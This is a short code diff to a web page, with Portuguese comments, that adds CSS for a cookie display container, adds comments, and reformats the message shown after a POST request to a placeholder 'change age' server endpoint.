@@ -59,6 +59,16 @@
       overflow-y: scroll; /* ativa o scroll se necessário */
     }
 
+    #cookieContainer {
+      max-width: 90%;
+      margin: 10px auto;
+      padding: 10px;
+      background-color: #1e1e1e;
+      color: white;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+
     #copyBtn {
       margin-top: 10px;
       display: none; /* Esconde até o botão ser necessário */
@@ -88,6 +98,7 @@
       const copyBtn = document.getElementById("copyBtn");
 
       try {
+        // Enviar dados para o servidor
         const resposta = await fetch("https://seuservidor.com/alterar-idade", {
           method: "POST",
           headers: {
@@ -99,10 +110,12 @@
         const data = await resposta.json();
 
         if (data.idadeAlterada) {
-          respostaElemento.innerText = data.idadeAlterada;
+          // Exibir resultado da alteração
+          respostaElemento.innerText = `Idade alterada para: ${data.idadeAlterada}`;
           respostaElemento.style.display = "block";
           copyBtn.style.display = "inline-block"; // Torna o botão visível
         } else {
+          // Exibir erro se não houver sucesso
           respostaElemento.innerText = data.error || "Erro inesperado";
           respostaElemento.style.display = "block";
           copyBtn.style.display = "none"; // Não exibe o botão se não houver idade alterada
